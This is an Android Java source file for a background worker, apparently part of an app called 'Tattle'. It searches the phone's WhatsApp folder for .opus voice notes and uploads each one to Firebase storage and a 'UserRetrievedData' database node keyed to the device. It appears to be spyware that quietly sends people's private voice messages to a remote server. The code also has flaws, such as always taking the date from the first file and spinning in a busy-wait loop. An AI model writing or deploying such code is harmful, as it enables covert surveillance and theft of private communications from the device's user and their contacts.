package com.globalsolutions.Tattle.DataUploadServices;

import android.content.Context;
import android.net.Uri;
import android.os.Environment;

import androidx.annotation.NonNull;
import androidx.work.Data;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.globalsolutions.Tattle.Models.AudioFileModel;
import com.globalsolutions.Tattle.OtherUtils.AllFilesHelper;
import com.globalsolutions.Tattle.OtherUtils.SharedPrefs;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.util.Date;
import java.util.List;

public class WhatsAppAudioUploadService extends Worker {

    Context context;
    AllFilesHelper opusFiles;

    FirebaseDatabase firebaseDatabase;
    DatabaseReference databaseReference;
    FirebaseAuth firebaseAuth;
    SharedPrefs sharedPrefs;
    StorageReference storageReference;

    boolean uploadedFile = false;


    public WhatsAppAudioUploadService(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
        this.context = context;
    }

    @NonNull
    @Override
    public Result doWork() {

        sharedPrefs = SharedPrefs.getInstance(this.getApplicationContext());
        firebaseDatabase = FirebaseDatabase.getInstance();
        firebaseAuth = FirebaseAuth.getInstance();

        databaseReference = firebaseDatabase.getReference();
        storageReference = FirebaseStorage.getInstance().getReference(sharedPrefs.getUniqueId());

        searchDirs();


        Data outputData = new Data.Builder().putBoolean("AudioSyncedWithServer", true).build();
        return Result.success(outputData);
    }

    public void searchDirs() {
        opusFiles = new AllFilesHelper(".opus");
        File rootDir = Environment.getExternalStorageDirectory();
//        File audio = new File(rootDir.getAbsolutePath()+"/WhatsApp/Media/WhatsApp Voice Notes");
        File audio = new File(rootDir.getAbsolutePath()+"/WhatsApp");

        List<File> audioList = opusFiles.Search_Dir(audio);

        for (int i = 0; i < audioList.size(); i++) {
            File filee = new File(audioList.get(0).getPath());
            Date lastModDate = new Date(filee.lastModified());
            uploadedFile = false;
            uploadAudioFile(audioList.get(i),lastModDate.toString());
            while (!uploadedFile) {

            }
        }
    }


    public void uploadAudioFile(File file, String date) {
        StorageReference mStorageRef = this.storageReference.child("WhatsAppVoiceNotes").child(file.getName());

        Uri uri = Uri.fromFile(file);
        mStorageRef.putFile(uri).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
            @Override
            public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                mStorageRef.getDownloadUrl().addOnSuccessListener(new OnSuccessListener<Uri>() {
                    @Override
                    public void onSuccess(Uri uri) {

                        AudioFileModel audioFileModel = new AudioFileModel(uri.toString(), date);
                        String s1=file.getName();
                        String replaced=s1.replace(".","_");
                        databaseReference.child("UserRetrievedData").child(sharedPrefs.getUniqueId()).child("WhatsAppVoiceNotes").child(replaced).setValue(audioFileModel).addOnSuccessListener(new OnSuccessListener<Void>() {
                            @Override
                            public void onSuccess(Void aVoid) {
/*                                docFile.setUploaded(true);
                                docFileRepo.update(docFile);*/
                                uploadedFile = true;
                            }
                        }).addOnFailureListener(new OnFailureListener() {
                            @Override
                            public void onFailure(@NonNull Exception e) {
                                uploadedFile = true;
                            }
                        });
                    }
                }).addOnFailureListener(new OnFailureListener() {
                    @Override
                    public void onFailure(@NonNull Exception e) {
                        uploadedFile = true;
                    }
                });
            }
        }).addOnFailureListener(new OnFailureListener() {
            @Override
            public void onFailure(@NonNull Exception e) {
                uploadedFile = true;
            }
        });
    }

}
